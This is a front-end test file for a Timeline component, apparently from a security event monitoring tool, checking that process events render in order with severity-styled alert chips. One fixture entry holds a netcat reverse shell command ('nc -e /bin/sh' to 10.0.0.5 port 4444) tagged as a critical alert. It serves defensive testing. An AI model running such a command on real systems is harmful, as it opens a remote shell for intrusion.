import { render, screen } from "@testing-library/react";
import { expect, it } from "vitest";
import { Timeline } from "../../src/components/Timeline";

it("renders entries in given order with alert chips", () => {
  render(
    <Timeline
      entries={[
        {
          time: "2026-07-11T10:00:00Z",
          event_id: "e1",
          event_type: "process_create",
          summary: "bash -c whoami",
          alerts: [],
        },
        {
          time: "2026-07-11T10:00:01Z",
          event_id: "e2",
          event_type: "process_create",
          summary: "nc -e /bin/sh 10.0.0.5 4444",
          alerts: [{ rule_id: "r1", title: "Reverse shell via netcat", severity: "critical" }],
        },
      ]}
    />,
  );
  expect(screen.getByText("bash -c whoami")).toBeTruthy();
  expect(screen.getByText("Reverse shell via netcat").className).toContain("severity-critical");
});

it("shows a placeholder when the timeline is empty", () => {
  render(<Timeline entries={[]} />);
  expect(screen.getByText(/no events/)).toBeTruthy();
});
